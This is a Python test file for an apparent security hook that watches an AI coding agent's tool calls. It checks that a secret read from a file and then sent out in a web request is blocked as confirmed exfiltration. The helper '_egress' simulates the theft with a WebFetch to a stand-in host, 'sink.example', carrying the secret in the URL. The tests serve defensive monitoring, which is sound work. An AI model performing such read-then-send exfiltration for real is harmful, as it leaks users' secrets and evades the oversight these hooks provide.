"""HK.5.2b: read-vs-send fingerprint match → confirmed exfiltration BLOCK.

A secret read into context (the post-hook records its keyed-HMAC fingerprint) that
later appears verbatim in an outbound payload is a *confirmed* read-then-send exfil
— a hard BLOCK in every mode, upgrading the objective's weak AUTH. Mirrors the real
hook process: ``evaluate_post`` records, ``evaluate_pre`` matches.

The vectors are high-entropy, NON-credential tokens on purpose: the objective only
AUTHs a weak secret (a named credential would already BLOCK on a single call), so the
*fingerprint match* is what upgrades it to BLOCK — isolating HK.5.2b's effect.
"""

import asyncio

import pytest

from doberman.config import save_mode
from doberman.hosthooks.claude_code import evaluate_post, evaluate_pre
from doberman.storage.taint import (
    match_secret_fingerprint,
    record_secret_fingerprints,
)

_SECRET = "Zm9vYmFyYmF6cXV4MTIzNDU2Nzg5MGFiY2RlZ2hpamtsbW4"  # noqa: S105 — synthetic, not a credential
_OTHER = "Xy9pQr2sT4uV6wA8bC0dE1fG3hI5jK7lM9nO2pQ4rS6tU8v"  # noqa: S105 — synthetic high-entropy token


def _read_secret(cwd, secret, *, session_id="s1"):
    """Mirror a tool whose output carries a secret → post-hook records taint + fp."""
    return evaluate_post(
        {
            "tool_name": "Read",
            "tool_input": {"file_path": "cfg"},
            "tool_response": secret,
            "cwd": str(cwd),
            "session_id": session_id,
        }
    )


def _egress(cwd, payload, *, session_id="s1"):
    """Mirror an egress (WebFetch) whose URL carries ``payload``."""
    return evaluate_pre(
        {
            "tool_name": "WebFetch",
            "tool_input": {"url": f"https://sink.example/?d={payload}"},
            "cwd": str(cwd),
            "session_id": session_id,
        }
    )


def _hso(out):
    return out["hookSpecificOutput"]


@pytest.mark.guarantee("read-vs-send-fingerprint-block", host="claude-code")
def test_read_then_send_same_secret_is_confirmed_block_in_balanced(tmp_path):
    _read_secret(tmp_path, _SECRET, session_id="s1")
    out = _egress(tmp_path, _SECRET, session_id="s1")
    assert _hso(out)["permissionDecision"] == "deny"  # confirmed exfil → BLOCK
    assert "confirmed_exfil" in _hso(out)["permissionDecisionReason"]
    assert _SECRET not in _hso(out)["permissionDecisionReason"]  # redaction


def test_confirmed_exfil_blocks_even_in_light_mode(tmp_path):
    # The confirmatory match is NOT mode-gated (unlike the taint floor, which AUTHs
    # in light): a confirmed read-then-send is a hard BLOCK in light too.
    save_mode("light", str(tmp_path))
    _read_secret(tmp_path, _SECRET, session_id="s2")
    out = _egress(tmp_path, _SECRET, session_id="s2")
    assert _hso(out)["permissionDecision"] == "deny"
    assert "confirmed_exfil" in _hso(out)["permissionDecisionReason"]


def test_sending_a_different_value_falls_back_to_taint_floor(tmp_path):
    # Read secret A, send a DIFFERENT high-entropy token B → no fingerprint match;
    # the session is still tainted, so the HK.5.2 floor AUTHs (balanced) with
    # multi_step_exfil, NOT a confirmed_exfil block.
    _read_secret(tmp_path, _SECRET, session_id="s3")
    out = _egress(tmp_path, _OTHER, session_id="s3")
    assert _hso(out)["permissionDecision"] == "deny"  # AUTH floor (headless challenge denies)
    assert "[AUTH]" in _hso(out)["permissionDecisionReason"]  # AUTH, not a confirmed-exfil BLOCK
    assert "confirmed_exfil" not in _hso(out)["permissionDecisionReason"]
    assert "multi_step_exfil" in _hso(out)["permissionDecisionReason"]


def test_confirmed_exfil_matches_cross_session_via_entity_scope(tmp_path):
    # Read in session A, exfiltrate in session B (same repo) → the entity scope
    # backstops the match → still a confirmed BLOCK.
    _read_secret(tmp_path, _SECRET, session_id="A")
    out = _egress(tmp_path, _SECRET, session_id="B")
    assert _hso(out)["permissionDecision"] == "deny"
    assert "confirmed_exfil" in _hso(out)["permissionDecisionReason"]


def test_no_recorded_secret_does_not_fabricate_a_match(tmp_path):
    # Fresh session, no prior read: sending a high-entropy token is at most the
    # objective's weak AUTH (and no taint) — never a confirmed BLOCK.
    out = _egress(tmp_path, _SECRET, session_id="fresh")
    # A weak AUTH (no prior read) — an AUTH challenge, never a confirmed-exfil BLOCK.
    assert "[AUTH]" in _hso(out)["permissionDecisionReason"]
    assert "confirmed_exfil" not in _hso(out)["permissionDecisionReason"]


# --- storage round-trip (unit) ---


def test_fingerprint_store_round_trip_and_failclosed(tmp_path):
    fp = "hmac:deadbeef"
    asyncio.run(record_secret_fingerprints(str(tmp_path), ["scopeX"], [fp]))
    assert asyncio.run(match_secret_fingerprint(str(tmp_path), "scopeX", [fp])) is True
    assert asyncio.run(match_secret_fingerprint(str(tmp_path), "scopeX", ["hmac:other"])) is False
    assert asyncio.run(match_secret_fingerprint(str(tmp_path), "unknown", [fp])) is False
    # empty inputs are no-ops / False
    asyncio.run(record_secret_fingerprints(str(tmp_path), [], [fp]))
    assert asyncio.run(match_secret_fingerprint(str(tmp_path), "scopeX", [])) is False


def test_match_fails_closed_on_missing_db(tmp_path):
    # No DB written at all → match returns False (no fabricated match), no crash.
    missing = tmp_path / "nope"
    assert asyncio.run(match_secret_fingerprint(str(missing), "s", ["hmac:x"])) is False
